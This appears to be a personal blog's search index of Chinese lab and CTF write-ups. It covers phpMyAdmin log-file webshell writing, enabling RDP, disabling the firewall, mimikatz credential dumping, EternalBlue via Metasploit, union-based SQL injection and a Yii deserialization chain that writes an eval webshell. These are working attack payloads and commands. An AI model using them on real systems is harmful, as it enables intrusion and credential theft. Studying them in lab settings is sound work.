<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第一篇文章</title>
      <link href="/2023/09/10/2023/"/>
      <url>/2023/09/10/2023/</url>
      
        <content type="html"><![CDATA[<h2 id="这是我的第一篇文章"><a href="#这是我的第一篇文章" class="headerlink" title="这是我的第一篇文章"></a>这是我的第一篇文章</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web渗透</title>
      <link href="/2023/08/12/web%E6%B8%97%E9%80%8F-php/"/>
      <url>/2023/08/12/web%E6%B8%97%E9%80%8F-php/</url>
      
        <content type="html"><![CDATA[<h1 id="Web渗透的简单流程"><a href="#Web渗透的简单流程" class="headerlink" title="Web渗透的简单流程"></a>Web渗透的简单流程</h1><h3 id="1、搭建靶机"><a href="#1、搭建靶机" class="headerlink" title="1、搭建靶机"></a>1、搭建靶机</h3><p>本次红队的靶场采用vulstack红队评估的靶场，从信息收集到控制DMZ区域的WEB服务器，接着联合MSF和CS控制内网机器，随后通过搭建隧道，配置代理，MS17010等攻击内网机器，并且控制域控，让你不在局限于WEB漏洞挖掘和打点技术，全身心的体验完整的攻击流程，提高自己的认知和眼界。</p><p>官网：靶场地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p><p>我们采用的是 win7 x64 操作系统</p><h4 id="1-配置靶场网卡模拟web服务器"><a href="#1-配置靶场网卡模拟web服务器" class="headerlink" title="1&gt;&gt;配置靶场网卡模拟web服务器"></a>1&gt;&gt;配置靶场网卡模拟web服务器</h4><p>设置虚拟机网络，手动添加VMnet3和VMnet4，具体设置如下</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/01.png"></p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/02.png"></p><p>设置完成后点击确定。打开靶场虚拟机设置，找到网络适配器，两个适配器都改为自定义，并选择好刚才添加的网络如下</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/03.png"></p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/04.png"></p><p>完成后打开靶场，找到网络共享中心开始设置两网卡的ipv4属性如下图</p><p>VMnet3</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/05.png"></p><p>VMnet4</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/06.png"></p><p>注：VMnet4一定要设置DNS</p><p>设置完成后，重启虚拟机就可以开始攻击了。</p><h3 id="2、-开始渗透"><a href="#2、-开始渗透" class="headerlink" title="2、 开始渗透"></a>2、 开始渗透</h3><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1&gt;&gt;信息收集"></a>1&gt;&gt;信息收集</h4><p>首先我们已知目标的ip:192.168.111.128。因为是自己搭建的靶机就不去收集子域名了直接看看他开放了哪些端口，并且扫描看是否存在敏感文件。</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/07.png"></p><p>根据结果发现开放了&#x2F;phpmyadmin&#x2F;index.php的url，我们打开发现是xampp的后台登录管理界面：</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/08.png"></p><p>接下来尝试使用phpmyadmin爆破工具来爆破这个管理员账号和密码：</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/09.png"></p><p>爆破出账户和密码都是 root 。</p><p>登录发现登录成功！</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/10.png"></p><h4 id="2-phpmyadmin-getshell"><a href="#2-phpmyadmin-getshell" class="headerlink" title="2&gt;&gt;phpmyadmin getshell"></a>2&gt;&gt;phpmyadmin getshell</h4><p>成功登录后，我们先查看当前的日志配置，使用SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/11.png"></p><p>指令运行成功后发现当前的日志路径的存放位置，并且是关闭状态</p><p>那么我们尝试使用指令开启日志</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure><p>运行成功后再次查看日志配置</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/12.png"></p><p>看到日志成功开启，但是日志的文件却在目标靶机的C盘下，我们无法通过web服务器直接访问，因此我们需要尝试自定义日志。</p><p>但是我们不清楚目标的文件路径，又回到主页面，发现探针那有显示完整的路径 ‘C:&#x2F;phpStudy&#x2F;www&#x2F;1.php’</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/13.png"></p><p>于是我们开始自定义日志路径，使用SQL指令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/lss.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>再次查看日志状态</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/14.png"></p><p>发现更改完成。</p><p>由于我们对数据库的操作会被保留在日志中，所以我们可以尝试向日志中写入一句话，尝试管理对方文件。</p><p>使用SQL查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eva($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>执行成功后使用蚁剑尝试管理</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/15.png"></p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/16.png"></p><p>管理成功后我们就成功了一半。</p><h4 id="3-开启3389进行连接"><a href="#3-开启3389进行连接" class="headerlink" title="3&gt;&gt;开启3389进行连接"></a>3&gt;&gt;开启3389进行连接</h4><p>木马已经写入到了文件中，接下来就是通过工具连接木马就可以实现远程控制对方的电脑查看3389开放情况使用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –ano </span><br></pre></td></tr></table></figure><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/17.png"></p><p>发现服务器没有开放3389端口，则我们使用指令尝试打开3389</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>执行成功后再次查看端口</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/18.png"></p><p>可以看见3389端口已经成功开放，但是，因为对方系统存在防火墙的缘故，直接连接远程桌面是连接不上的，因此我们还需要使用指令，关闭对方防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>想要查看对方防火墙状态可以使用指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure><p>运行完关闭指令后，查看防火墙状态</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/01-16919176372349.png"></p><p>可以看到，防火墙已经禁用，证明可以通过远程控制控制桌面。</p><p>但是我们没有对方用户和账号，所以还需要抓取对方的用户和账号。</p><p>我们使用蚁剑，上传一个mimikat的工具程序，再使用终端指向这个程序就可获取账户和密码。</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/02-169191782026411.png"></p><p>可以看到上传成功。</p><p>接下来使用指令运行该程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/03-169191791413513.png"></p><p>可以看到对方登录密码是 hongrisec@2019，同时也知道了用户名，如果看不懂的话，也可以使用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>查看用户名。</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/04-169191803947115.png"></p><p>那么就得知了登录这台机器的用户名和密码。</p><h4 id="4-远程控制"><a href="#4-远程控制" class="headerlink" title="4&gt;&gt;远程控制"></a>4&gt;&gt;远程控制</h4><p>直接使用windows的远程桌面登录</p><p><img src="/../imgs/web%E6%B8%97%E9%80%8F-php/05-169191819632717.png"></p><p>然后成功登录。自此web渗透完毕。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在渗透时有无数种方法进行webshell，因此要多学多总结，同时还要弄懂其中的原理。以上文章，若有表达错误或不准确之处，欢迎大佬留言指出，我会第一时间进行更正。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-永恒之蓝</title>
      <link href="/2023/07/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2023/07/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<p>攻击靶场：windows7操作系统</p><p>渗透工具：kali操作系统</p><h1 id="windows-永恒之蓝攻击"><a href="#windows-永恒之蓝攻击" class="headerlink" title="windows 永恒之蓝攻击"></a>windows 永恒之蓝攻击</h1><p>​       永恒之蓝(EternalBlue)是由美国国家安全局开发的漏洞利用程序,对应微软漏洞编号ms17-010。该漏洞利用工具由一个名为”影子经济人”（Shadow Brokers）的神秘黑客组织于2017年4月14日公开的利用工具之一，该漏洞利用工具针对TCP 445端口(Server Message Block&#x2F;SMB)的文件分享协议进行攻击，攻击成功后将被用来传播病毒木马。由于利用永恒之蓝漏洞利用工具进行传播病毒木马事件多，影响特大，因此很多时候默认将ms17-010漏洞称为“永恒之蓝”。</p><p>​        扫描目标端口，如果存在445端口，则证明可能存在永恒之蓝漏洞，可使用工具msf进行探查。</p><h3 id="第一步，扫描目标端口"><a href="#第一步，扫描目标端口" class="headerlink" title="第一步，扫描目标端口"></a>第一步，扫描目标端口</h3><p>打开msf工具后，使用nmap工具扫描搭建好的靶机端口。</p><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole   #打开工具</span><br><span class="line">db_status    #检查数据库连接状态。msf使用的数据库是 postgresql</span><br><span class="line">nmap 192.168.108.131    #扫描端口</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/01.png"></p><p>从扫描结果发现445端口开放，则可能存在永恒之蓝的漏洞，因此，可继续使用msf的 ms17_010 模块探查。</p><h3 id="第二步，对端口进行攻击"><a href="#第二步，对端口进行攻击" class="headerlink" title="第二步，对端口进行攻击"></a>第二步，对端口进行攻击</h3><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/02.png"></p><p>可以看到msf的 ms17_010 模块存在3个攻击载荷，这里我们使用的是 “ms17_010_eternalblue ” 载荷，也就是标号为零的这一个。</p><p>使用指令使用攻击载荷的方式后，可以看到切换到了 ms17_010，但是，却显示一个 “no payload” ,这时，我们使用options查看使用该载荷需要哪些必要条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0    或者    use ms17_010_eternalblue</span><br><span class="line">options</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/03.png"></p><p>可以看到，我们在使用这个攻击方式有个必要前提，必须要有指定的 “rhosts” （图中Required显示为 ‘yes’ 的部分就是必须要有的参数。Current 则是显示参数内容，如果存在一个值，就证明该必要参数已经存在，这里就只需要 “rhosts” ）</p><p>则使用指令给予 “rhosts” ( 这里的 “rhosts”其实就是目标靶机的ip地址 ) 参数。</p><p>然后 “run” ，进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set 192.168.108.131</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/04.png"></p><p>攻击结果如果是 “WIN” ，则表示攻击成功，已经可以进行一些列安全操作。</p><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/05.png"></p><h3 id="第三步，破解普通用户名和密码"><a href="#第三步，破解普通用户名和密码" class="headerlink" title="第三步，破解普通用户名和密码"></a>第三步，破解普通用户名和密码</h3><p>攻击成功后，我们加载msf中的工具 “kiwi”，或者直接输入指令 “hashdump” 获得用户名和md5加密后的密码。（但是比价麻烦，可以直接使用kiwi。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/06.png"></p><p>显示 “Success” 就证明加载成功了，戒指使用指令获取靶机的普通用户和密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/07.png"></p><p>获取到用户名为：hhh  密码为：123456</p><h3 id="第四步，开始远程登录并管理"><a href="#第四步，开始远程登录并管理" class="headerlink" title="第四步，开始远程登录并管理"></a>第四步，开始远程登录并管理</h3><p>获取到用户名和密码后，保存一下会话，使用nmap查看 3389 端口是否打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">nmap 192.168.108.131</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/08.png"></p><p>可以看到，刚才的会话被保存为 “session 1” ，并且目标并没有开启 “3389” 端口，则不能使用远程登录。但是我们的工具msf中存在远程登录的模块，因此可以使用msf来尝试打开目标的 “3389” 端口。</p><p>使用指令更换攻击模块为远程攻击模块,再使用相对应的攻击载荷，并查看需要哪些不要参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search enable_rdp</span><br><span class="line">use 0   或者  use enable_rdp</span><br><span class="line">options</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/09.png"></p><p>发现，只需要的参数为 “session” ，就是刚才我们保存的 “session 1” 会话，使用指令添加 session。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set session 1</span><br></pre></td></tr></table></figure><p><img src="C:/Users/Saber/Desktop/10.png"></p><p>参数加载完成后我们 run 一下，看是否成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/11.png"></p><p>可以看到攻击成功。</p><p>我们再查看 3389 端口是否开启。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">back   #停止当前会话</span><br><span class="line">nmap 192.168.108.131</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/12.png"></p><p>发现3389端口已经打开，则可以开始远程登录控制。</p><p>使用指令远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.108.131</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/13.png"></p><p>选择 yes 后成功登录。</p><p><img src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/14.png"></p><p>则我们可以开始进行我们的恶意操作。</p><p>自此，此次永恒之蓝的利用结束。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次渗透主要使用了我们的工具 msf ，它内置了许多攻击脚本，有许多漏洞的攻击方式。并且还在一直更新。如果将渗透学到极致，就必须熟练掌握这个工具。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永恒之蓝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL-sqli</title>
      <link href="/2023/06/17/SQL-sqli/"/>
      <url>/2023/06/17/SQL-sqli/</url>
      
        <content type="html"><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>打开环境，页面显示：</p><p><img src="/../imgs/SQL-sqli-1/01.png"></p><p>要求我们传入 id的值。</p><p>我们首先先传入id看看回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>发现页面显示正常。接着判断是否存在注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 -- q</span><br></pre></td></tr></table></figure><p>页面显示正常，接着：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 -- q</span><br></pre></td></tr></table></figure><p>然后页面就报错：</p><p><img src="/../imgs/SQL-sqli-1/02.png"></p><p>证明存在注入点。</p><p>开始判断字段数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 1 -- q</span><br><span class="line">?id=1&#x27; order by 2 -- q</span><br><span class="line">?id=1&#x27; order by 3 -- q</span><br><span class="line">?id=1&#x27; order by 4 -- q</span><br></pre></td></tr></table></figure><p>发现判断到4的时候页面报错，证明字段数应该只有3位。</p><p>开始判断显错位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&#x27; union select 1,2,3 -- q</span><br></pre></td></tr></table></figure><p>注意，这里为什么要将1改为100，是为了成功执行我们的联合查询中的显错位，这里的id不存在100位这么多，就会将后面的联合查询中的1，2，3，显示出来。</p><p>得到回显：</p><p><img src="/../imgs/SQL-sqli-1/03.png"></p><p>可以发现我们可以控制2，3出现的位置，那么开始判断库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&#x27; union select 1,database(),3  -- q</span><br></pre></td></tr></table></figure><p>这里的 database()是数据库的内置函数，用于返回当操作的数据库名称。</p><p>知道库名为 “security” 后，开始判断表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=100&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1 -- q</span><br><span class="line"></span><br><span class="line">?id=100&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1 -- q</span><br><span class="line"></span><br><span class="line">?id=100&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1 -- q</span><br><span class="line"></span><br><span class="line">?id=100&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;security&#x27; limit 4,1 -- q</span><br></pre></td></tr></table></figure><p>查询出表名有：emails，referers，uagents，users 四个。</p><p>补充：这里使用 limit 一个一个回显太麻烦，可以使用数据库的内置函数 group_concat() 来将表名一次性输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; -- q</span><br></pre></td></tr></table></figure><p>得到回显：</p><p><img src="/../imgs/SQL-sqli-1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-17%20174625.png"></p><p>知道表名后，最让我们感兴趣的莫过于表 “users” ，于是针对这个表，我们开始判断列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- q</span><br></pre></td></tr></table></figure><p>得到页面回显：</p><p><img src="/../imgs/SQL-sqli-1/04.png"></p><p>查询出有3个列名：id，username，password</p><p>让我们想要的可以看到分别是：username，password</p><p>于是开始根据这两个列名判断数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&#x27; union select 1,group_concat(username),group_concat(password) from users -- q</span><br></pre></td></tr></table></figure><p>得到页面回显：</p><p><img src="/../imgs/SQL-sqli-1/05.png"></p><p>这样就得到了用户名和相对应的密码，那么这题就成功解决了。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这题相对简单，最重要的是要对Mysql数据库有一定的了解。同时还要学习一定的sql语句。做这种有回显的题目，流程大致不变。若以上文章有不严谨、错误的地方，欢迎大家及时指正，我会在第一时间更改。希望大家一起共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-14</title>
      <link href="/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-14/"/>
      <url>/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-14/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-268"><a href="#题目来源：CTFshow-web入门-php反序列化-268" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-268"></a>题目来源：CTFshow web入门-php反序列化-268</h2><p>打开环境，发现和上一题具有异曲同工之妙，冲服上一题的步骤，发现一直写入不成功，可能是这条链子被过滤，因此我们换一条链子试试看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt; /var/www/html/basic/web/2.php&#x27;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize(<span class="subst">$exp</span>)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入参数后发现写入成功，使用写入的一句话木马即可获得flag：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-14/07.png"></p><p>flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">70805</span>a57-<span class="number">4758</span>-<span class="number">436</span>a-ae38-b44c2716ad07&#125; </span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>和上一题类似，不在多说。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
